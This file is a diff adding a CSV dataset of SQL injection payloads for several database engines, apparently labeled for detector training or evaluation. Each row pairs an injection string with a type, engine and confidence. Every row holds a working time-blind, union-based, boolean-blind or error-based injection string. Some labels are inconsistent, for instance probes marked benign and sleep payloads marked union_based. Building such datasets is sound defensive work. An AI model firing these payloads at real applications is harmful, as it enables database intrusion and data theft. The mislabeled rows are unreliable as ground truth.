@@ -1,0 +1,201 @@
+id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
+21674,"1%"" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ""%"" = """,time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
+21723,"1' where 1272 = 1272 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
+21744,"1"" ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ""nubc"" like ""nubc",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
+21746,"1 ) where 1415 = 1415 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
+21656,-1257' ) order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 20 chars.,2
+21665,"-6546"" ) order by 1#",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 20 chars.,2
+21687,"1',iif ( 9496 = 4153,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 28 chars.,2
+21781,1' ) as njfg where 6392 = 6392 waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
+21602,"-4828'+ ( select qxnw where 9488 = 9488 union all select 9488,9488--",union_based,generic,0.7,UNION-based payload detected. Payload length: 68 chars.,2
+21606,"-3710 ) ) union all select 5770,5770,5770,5770,5770,5770,5770#",union_based,generic,0.7,UNION-based payload detected. Payload length: 62 chars.,2
+21607,1' ) where 7537 = 7537 and 2006 = 2006,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 38 chars.,2
+21611,"-8792 union all select 1246,1246,1246,1246,1246,1246,1246--",union_based,generic,0.7,UNION-based payload detected. Payload length: 59 chars.,2
+21614,"-7916' ) ) union all select 9299,9299,9299,9299,9299,9299,9299,9299,9299,9299#",union_based,generic,0.7,UNION-based payload detected. Payload length: 78 chars.,2
+21615,1%' and 9198 = 9198--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
+21616,"1'|| ( select 'fdkl' where 4572 = 4572 union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 101 chars.,2
+21621,"1"" ) ) as ubrg where 7318 = 7318 and 7331 = 6529--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,2
+21636,"1' where 2391 = 2391 union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 89 chars.,2
+21637,"1"" ) as lgxc where 1117 = 1117 union all select null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 88 chars.,2
+21640,"1' union all select null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 45 chars.,2
+21644,"1%"" ) ) union all select null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 30 chars.,2
+21646,-4557%' ) ) or 4537 = 3401 and ( ( '%' = ',boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 42 chars.,2
+21651,"1"" ) ) as uxnc where 8041 = 8041 and 9198 = 9198--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,2
+21653,-7442 ) or 3391 = 7492,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
+21654,"1%' ) union all select null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 64 chars.,2
+21658,"-4739' ) ) union all select 6585,6585,6585,6585,6585--",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,2
+21662,"1"" ) as yphz where 8174 = 8174 union all select null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 84 chars.,2
+21664,"1'|| ( select 'ukfj' where 7133 = 7133 union all select null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 71 chars.,2
+21667,"-9032 ) ) union all select 8377,8377,8377,8377,8377,8377,8377,8377,8377#",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
+21671,"1"" ) as qwyt where 4236 = 4236 union all select null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
+21673,"-2643%"" union all select 7779,7779--",union_based,generic,0.7,UNION-based payload detected. Payload length: 36 chars.,2
+21680,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
+21686,-8625 or 3176 = 2519# fvgl,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,2
+21697,"1"" and 4595 = 4595#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 19 chars.,2
+21704,"-6158"" ) ) ) or 8571 = 8571--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 29 chars.,2
+21711,"-5560"" ) ) or 7292 = 6184#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,2
+21713,"-3013' ) where 2027 = 2027 union all select 2027,2027,2027,2027--",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
+21722,"1"" ) ) as tpeh where 6306 = 6306 and 5965 = 5806#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 49 chars.,2
+21732,"1"" ) and 2954 = 1256--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
+21735,"-7347"" ) ) union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360#",union_based,generic,0.7,UNION-based payload detected. Payload length: 73 chars.,2
+21740,"1"" ) ) union all select null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 44 chars.,2
+21760,"1"" ) ) ) and 7135 = 8805#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2
+21773,1' ) and 7533 = 7533 and ( 'cryr' = 'cryr,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 41 chars.,2
+21775,-2214' ) union all select 8228#,union_based,generic,0.7,UNION-based payload detected. Payload length: 31 chars.,2
+21780,-4873' ) ) ) or 3038 = 3038,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2
+21782,1' and 7533 = 7533 and 'jwgc' = 'jwgc,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 37 chars.,2
+21786,"-2359' union all select 2687,2687,2687#",union_based,generic,0.7,UNION-based payload detected. Payload length: 39 chars.,2
+21789,-4184' ) ) ) or 2579 = 4654#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 28 chars.,2
+21798,"1%' ) ) union all select null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 60 chars.,2
+21799,"-3979' in boolean mode ) union all select 4911,4911,4911,4911,4911,4911,4911,4911,4911,4911#",union_based,generic,0.7,UNION-based payload detected. Payload length: 92 chars.,2
+21604,"1' in boolean mode ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
+21605,"1' ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
+21613,"1' ) ) as jvwq where 6596 = 6596 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
+21620,"1' or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
+21628,1 ) as iknl where 3885 = 3885 rlike sleep ( 5 ) #,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
+21629,"1' ) ) as oocd where 2919 = 2919 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
+21669,"1' ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
+21682,"1%"" ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
+21684,"1"" ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ""hmun"" = ""hmun",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
+21688,"1' where 6963 = 6963 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
+21692,"1%"" ) ) rlike sleep ( 5 ) and ( ( ""%"" = """,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
+21705,"1' ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 'pbqg' = 'pbqg",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
+21708,"1%' ) ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( '%' = '",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
+21710,"1%"" or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ""%"" = """,time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
+21712,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'gsup' = 'gsup",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
+21721,"1' in boolean mode ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) #",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
+21727,"1 ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
+21736,"1' ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'xikz' like 'xikz",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
+21737,"1 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 )",error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
+21765,"1' procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and 'gbpg' = 'gbpg",error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
+21768,"1' where 1230 = 1230 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
+21777,"1 ) ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
+21793,"1%' ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
+21795,"1"" ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ""lsca"" like ""lsca",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
+21600,"1"" and sleep ( 5 ) and ""masm"" = ""masm",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
+21617,"1"" ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( ""awyk"" like ""awyk",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
+21626,"-7551 or elt ( 6900 = 7195,7195 )",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
+21634,1 ) where 7165 = 7165 and sleep ( 5 ) #,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
+21638,1%' ) and sleep ( 5 ) #,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
+21661,"1' ) ) as wves where 2641 = 2641 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
+21675,"-1526' ) ) or elt ( 1032 = 1032,3623 ) and ( ( 'xpob' = 'xpob",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
+21676,1 where 1931 = 1931 and sleep ( 5 ) --,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
+21678,"-4515"" ) or elt ( 4545 = 2509,2509 ) and ( ""lglx"" = ""lglx",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
+21685,"1%' ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
+21714,"1"" ) or sleep ( 5 ) #",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
+21730,1%' ) ) or sleep ( 5 ) and ( ( '%' = ',time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
+21762,"-8600"" or elt ( 1032 = 1032,3623 ) and ""kfsn"" like ""kfsn",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
+21767,"1"" ) ) ) and sleep ( 5 ) and ( ( ( ""fdvc"" like ""fdvc",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
+21774,"1 ) and elt ( 3138 = 1817,1817 )",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
+21679,"1%"" ) ) ) and make_set ( 8191 = 7813,7813 ) and ( ( ( ""%"" = """,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 61 chars.,1
+21694,"end and ( ( ( ""memh"" like ""memh",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 31 chars.,1
+21725,"-5288' ) or make_set ( 1164 = 1710,1710 ) and ( 'pkwy' = 'pkwy",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 62 chars.,1
+21739,"1%"" ) ) ) and ( 3502 = 7893 ) *7893 and ( ( ( ""%"" = """,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 53 chars.,1
+21796,1' in boolean mode ) and ( 8610 = 2985 ) *2985#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 47 chars.,1
+21601,1' ) as hcpp where 1863 = 1863,benign,generic,0.5,. Payload length: 30 chars.,1
+21624,"1"" where 7828 = 7828",benign,generic,0.5,. Payload length: 20 chars.,1
+21635,1' ) where 3588 = 3588,benign,generic,0.5,. Payload length: 22 chars.,1
+21681,"1"" ) where 5491 = 5491",benign,generic,0.5,. Payload length: 22 chars.,1
+21691,"1"" ) ) as jucs where 6836 = 6836",benign,generic,0.5,. Payload length: 32 chars.,1
+21698,1 ) where 2083 = 2083,benign,generic,0.5,. Payload length: 21 chars.,1
+21716,1 ) ) as eigk where 2557 = 2557,benign,generic,0.5,. Payload length: 31 chars.,1
+21742,"1"" ) as ronb where 9368 = 9368",benign,generic,0.5,. Payload length: 30 chars.,1
+21745,1 ) ) as oqyo where 7995 = 7995,benign,generic,0.5,. Payload length: 31 chars.,1
+21757,1 ) ) as pmff where 6649 = 6649,benign,generic,0.5,. Payload length: 31 chars.,1
+21761,"1"" ) ) as xcyo where 2929 = 2929",benign,generic,0.5,. Payload length: 32 chars.,1
+21787,1 ) where 2940 = 2940,benign,generic,0.5,. Payload length: 21 chars.,1
+21794,"1"" ) as kzuq where 4259 = 4259",benign,generic,0.5,. Payload length: 30 chars.,1
+21608,"-1272' or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",union_based,generic,1.0,"Signals: 'concat', 'case'; UNION-based payload detected",0
+21610,"1"" ) ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ( ""felm"" = ""felm",time_blind,mysql,1.0,"Signals: 'elt', 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql",0
+21618,1%' ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( '%' = ',union_based,oracle,1.0,"Signals: 'xmltype', 'chr', 'case'; UNION-based payload detected; DB: oracle",0
+21623,"1 ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( 5874 = 5874",time_blind,mysql,1.0,"Signals: 'elt', 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql",0
+21632,"1%"" ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ( ""%"" = """,union_based,mysql,1.0,"Signals: 'sleep', 'rlike'; UNION-based payload detected; DB: mysql",0
+21639,"1%' ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( '%' = '",union_based,mysql,1.0,"Signals: 'extractvalue', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
+21641,"1, ( select ( case when ( 1570 = 1570 ) then ( select 1570 from pg_sleep ( 5 ) ) else 1/ ( select 0 ) end ) )",union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep', 'case'; UNION-based payload detected; DB: postgresql",0
+21645,"1' ) ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ( 'aiuy' = 'aiuy",time_blind,mysql,1.0,"Signals: 'elt', 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql",0
+21648,"1' ) ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ( 'aduc' = 'aduc",union_based,mysql,1.0,"Signals: 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
+21649,"1%"" ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ""%"" = """,union_based,oracle,1.0,"Signals: 'chr', 'case', 'ctxsys'; UNION-based payload detected; DB: oracle",0
+21650,"1%' ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( '%' = '",time_blind,mysql,1.0,"Signals: 'elt', 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql",0
+21652,1' ) ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ( 'ywbs' = 'ywbs,union_based,mysql,1.0,"Signals: 'rlike', 'case'; UNION-based payload detected; DB: mysql",0
+21655,1 ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ),union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
+21657,1' ) where 9317 = 9317 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --,union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
+21660,"-3472' or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",union_based,mssql,1.0,"Signals: 'convert', 'char', 'case'; UNION-based payload detected; DB: mssql",0
+21663,"1%"" ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
+21668,-6792 ) ) as zlho where 4758 = 4758 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,union_based,mssql,1.0,"Signals: 'char', 'case'; UNION-based payload detected; DB: mssql",0
+21672,select ( case when ( 2783 = 9216 ) then 1 else 2783* ( select 2783 from master..sysdatabases ) end ) --,union_based,generic,1.0,"Signals: 'case', 'sysdatabases'; UNION-based payload detected",0
+21683,"1' ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) )",union_based,generic,1.0,"Signals: 'substring', 'substr', 'char'; UNION-based payload detected",0
+21690,1' ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( 'mptm' = 'mptm,union_based,generic,1.0,"Signals: 'chr', 'cast', 'case'; UNION-based payload detected",0
+21695,"1"" rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ""qfhv"" = ""qfhv",union_based,mysql,1.0,"Signals: 'rlike', 'case'; UNION-based payload detected; DB: mysql",0
+21696,-9553 ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 5299 = 5299,union_based,oracle,1.0,"Signals: 'chr', 'case', 'dual'; UNION-based payload detected; DB: oracle",0
+21700,"1"" ) ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( ""obau"" = ""obau",union_based,mysql,1.0,"Signals: 'extractvalue', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
+21702,"1'+ ( select papc where 8900 = 8900 and elt ( 3114 = 3114,sleep ( 5 ) ) #",union_based,mysql,1.0,"Signals: 'elt', 'sleep'; UNION-based payload detected; DB: mysql",0
+21706,"1"" ) as sstd where 9629 = 9629 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",union_based,mysql,1.0,"Signals: 'updatexml', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
+21707,"1'+ ( select 'ycvl' where 8415 = 8415 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",union_based,generic,1.0,"Signals: 'substring', 'substr', 'char'; UNION-based payload detected",0
+21709,1 or 6793 = ( select 6793 from pg_sleep ( 5 ) ),union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
+21717,1'|| ( select 'gbyh' from dual where 5889 = 5889 order by 1#,union_based,mysql,1.0,"Signals: 'ord', 'dual'; UNION-based payload detected; DB: mysql",0
+21718,"1 ) ) as rqbo where 2243 = 2243 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'exp'; UNION-based payload detected; DB: mysql",0
+21719,"1 ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",union_based,mssql,1.0,"Signals: 'convert', 'char', 'case'; UNION-based payload detected; DB: mssql",0
+21720,"1%"" ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( ""%"" = """,union_based,mysql,1.0,"Signals: 'elt', 'concat', 'exp'; UNION-based payload detected; DB: mysql",0
+21724,-7072' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ),union_based,oracle,1.0,"Signals: 'xmltype', 'chr', 'case'; UNION-based payload detected; DB: oracle",0
+21728,"1' ) ) as ijyi where 3694 = 3694 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",union_based,generic,1.0,"Signals: 'substring', 'substr', 'char'; UNION-based payload detected",0
